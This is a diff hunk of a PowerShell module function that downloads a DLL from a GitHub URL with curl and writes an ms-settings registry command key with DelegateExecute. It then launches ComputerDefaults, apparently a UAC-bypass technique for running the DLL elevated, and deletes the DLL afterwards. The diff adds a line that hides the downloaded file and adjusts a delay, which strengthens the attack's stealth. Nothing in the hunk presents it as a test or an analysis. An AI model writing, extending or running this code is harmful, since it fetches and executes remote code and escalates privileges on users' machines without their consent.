@@ -635,11 +635,11 @@ function process-aucdown {
 curl https://github.com/sc4r3c0d3/tsk2lvgen/raw/refs/heads/main/mcucbps.dll -o $env:USERPROFILE\mcucbps.dll
 $Request = "control.exe $env:USERPROFILE\mcucbps.dll" 
 cmd /c reg add "HKCU\software\classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "$Request" /f
-clear;sleep(9.3)
+clear; attrib +h "$env:USERPROFILE\mcucbps.dll" ;sleep(9.3)
 cmd /c powershell -Command "New-ItemProperty -Path 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force |OUT-NULL";clear
 $IDPORT = (get-process lsass).Id;ComputerDefaults -PID '$IDPORT' -File '$Request'
 clear
-sleep(2.0)
+sleep(2.3)
 del "$env:USERPROFILE\mcucbps.dll" -force -ErrorAction ignore
 }
 Export-ModuleMember -Function process-aucdown
